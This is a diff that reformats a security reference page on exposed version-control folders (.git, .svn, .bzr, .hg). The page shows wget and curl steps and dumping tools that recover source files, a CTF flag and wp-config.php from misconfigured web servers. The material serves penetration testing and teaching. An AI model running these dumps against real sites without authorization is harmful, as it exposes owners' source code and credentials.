@@ -1,34 +1,34 @@
 # Insecure Source Code Management
 
-* [Git](#git)
-  + [Example](#example)
+- [Git](#git)
+  - [Example](#example)
     - [Recovering file contents from .git/logs/HEAD](#recovering-file-contents-from-gitlogshead)
     - [Recovering file contents from .git/index](#recovering-file-contents-from-gitindex)
-  + [Tools](#tools)
+  - [Tools](#tools)
     - [Automatic recovery](#automatic-recovery)
-      * [git-dumper.py](#git-dumperpy)
-      * [digit.py](#diggitpy)
-      * [GoGitDumper](#gogitdumper)
-      * [rip-git](#rip-git)
-      * [GitHack](#githack)
-      * [GitTools](#gittools)
+      - [git-dumper.py](#git-dumperpy)
+      - [diggit.py](#diggitpy)
+      - [GoGitDumper](#gogitdumper)
+      - [rip-git](#rip-git)
+      - [GitHack](#githack)
+      - [GitTools](#gittools)
     - [Harvesting secrets](#harvesting-secrets)
-      * [trufflehog](#trufflehog)
-      * [Yar](#yar)
-      * [Gitrob](#gitrob)
-      * [Gitleaks](#gitleaks)
-* [Subversion](#subversion)
-  + [Example (Wordpress)](#example-wordpress)
-  + [Tools](#tools-1)
+      - [trufflehog](#trufflehog)
+      - [Yar](#yar)
+      - [Gitrob](#gitrob)
+      - [Gitleaks](#gitleaks)
+- [Subversion](#subversion)
+  - [Example (Wordpress)](#example-wordpress)
+  - [Tools](#tools-1)
     - [svn-extractor](#svn-extractor)
-* [Bazaar](#bazaar)
-  + [Tools](#tools-2)
+- [Bazaar](#bazaar)
+  - [Tools](#tools-2)
     - [rip-bzr.pl](#rip-bzrpl)
     - [bzr_dumper](#bzr_dumper)
-* [Mercurial](#mercurial)
-  + [Tools](#tools-3)
+- [Mercurial](#mercurial)
+  - [Tools](#tools-3)
     - [rip-hg.pl](#rip-hgpl)
-* [References](#references)
+- [References](#references)
 
 ## Git
 
@@ -46,53 +46,57 @@ Check for the following files, if they exist you can extract the .git folder.
 
 1. Check for 403 Forbidden or directory listing to find the `/.git/` directory
 2. Git saves all information in `.git/logs/HEAD` (try lowercase `head` too)
-    ```powershell
-    0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
-    15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.
-    26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.
-    6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.
-    ```
+   ```powershell
+   0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
+   15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.
+   26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.
+   6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.
+   ```
 3. Access the commit using the hash
-    ```powershell
-    # create an empty .git repository
-    git init test
-    cd test/.git
 
-    # download the file
-    wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
+   ```powershell
+   # create an empty .git repository
+   git init test
+   cd test/.git
 
-    # first byte for subdirectory, remaining bytes for filename
-    mkdir .git/object/26
-    mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/
+   # download the file
+   wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
 
-    # display the file
-    git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
-        tree 323240a3983045cdc0dec2e88c1358e7998f2e39
-        parent 15ca375e54f056a576905b41a417b413c57df6eb
-        author Michael <michael@easyctf.com> 1489390329 +0000
-        committer Michael <michael@easyctf.com> 1489390329 +0000
-        Initial.
-    ```
+   # first byte for subdirectory, remaining bytes for filename
+   mkdir .git/object/26
+   mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/
+
+   # display the file
+   git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
+       tree 323240a3983045cdc0dec2e88c1358e7998f2e39
+       parent 15ca375e54f056a576905b41a417b413c57df6eb
+       author Michael <michael@easyctf.com> 1489390329 +0000
+       committer Michael <michael@easyctf.com> 1489390329 +0000
+       Initial.
+   ```
+
 4. Access the tree 323240a3983045cdc0dec2e88c1358e7998f2e39
-    ```powershell
-    wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
-    mkdir .git/object/32
-    mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/
 
-    git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
-        040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css
-        100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
-        040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
-        100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
-        040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js
-    ```
+   ```powershell
+   wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
+   mkdir .git/object/32
+   mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/
+
+   git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
+       040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css
+       100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
+       040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
+       100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
+       040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js
+   ```
+
 5. Read the data (flag.txt)
-    ```powershell
-    wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
-    mkdir .git/object/cb
-    mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/
-    git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
-    ```
+   ```powershell
+   wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
+   mkdir .git/object/cb
+   mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/
+   git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
+   ```
 
 #### Recovering file contents from .git/index
 
@@ -106,14 +110,14 @@ gin ~/git-repo/.git/index
 Recover name and sha1 hash of every file listed in the index, and use the same process above to recover the file.
 
 ```powershell
-$ gin .git/index | egrep -e "name|sha1" 
+$ gin .git/index | egrep -e "name|sha1"
 name = AWS Amazon Bucket S3/README.md
 sha1 = 862a3e58d138d6809405aa062249487bee074b98
 
 name = CRLF injection/README.md
 sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
 ```
- 
+
 ### Tools
 
 #### Automatic recovery
@@ -126,12 +130,12 @@ pip install -r requirements.txt
 ./git-dumper.py http://web.site/.git ~/website
 ```
 
-##### digit.py
+##### diggit.py
 
 ```powershell
-git clone https://github.com/bl4de/security-tools/ && cd security-tools/digit
-./digit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]
-./digit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1
+git clone https://github.com/bl4de/security-tools/ && cd security-tools/diggit
+./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]
+./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1
 
 -u is remote path, where .git folder exists
 -t is path to local folder with dummy Git repository and where blob content (files) are saved with their real names (cd /path/to/temp/folder && git init)
@@ -153,7 +157,7 @@ git checkout
 git clone https://github.com/kost/dvcs-ripper
 perl rip-git.pl -v -u "http://web.site/.git/"
 
-git cat-file -p 07603070376d63d911f608120eb4b5489b507692  
+git cat-file -p 07603070376d63d911f608120eb4b5489b507692
 tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
 parent 15ca375e54f056a576905b41a417b413c57df6eb
 author Michael <michael@easyctf.com> 1489389105 +0000
@@ -235,14 +239,14 @@ curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
 ```
 
 1. Download the svn database from http://server/path_to_vulnerable_site/.svn/wc.db
-    ```powershell
-    INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
-    ```
+   ```powershell
+   INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
+   ```
 2. Download interesting files
-    * remove \$sha1\$ prefix
-    * add .svn-base postfix
-    * use first byte from hash as a subdirectory of the `pristine/` directory (`94` in this case)
-    * create complete path, which will be: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`
+   - remove \$sha1\$ prefix
+   - add .svn-base postfix
+   - use first byte from hash as a subdirectory of the `pristine/` directory (`94` in this case)
+   - create complete path, which will be: `http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`
 
 ### Tools
 
@@ -269,7 +273,7 @@ docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-b
 ```powershell
 git clone https://github.com/SeahunOh/bzr_dumper
 python3 dumper.py -u "http://127.0.0.1:5000/" -o source
-Created a standalone tree (format: 2a)                                                                                                                                                       
+Created a standalone tree (format: 2a)
 [!] Target : http://127.0.0.1:5000/
 [+] Start.
 [+] GET repository/pack-names
@@ -286,7 +290,7 @@ Created a standalone tree (format: 2a)
 $ bzr revert
  N  application.py
  N  database.py
- N  static/   
+ N  static/
 ```
 
 ## Mercurial
@@ -303,5 +307,5 @@ docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-h
 ## References
 
 - [bl4de, hidden_directories_leaks](https://github.com/bl4de/research/tree/master/hidden_directories_leaks)
-- [bl4de, digit](https://github.com/bl4de/security-tools/tree/master/digit)
+- [bl4de, diggit](https://github.com/bl4de/security-tools/tree/master/diggit)
 - [Gitrob: Now in Go - Michael Henriksen](https://michenriksen.com/blog/gitrob-now-in-go/)
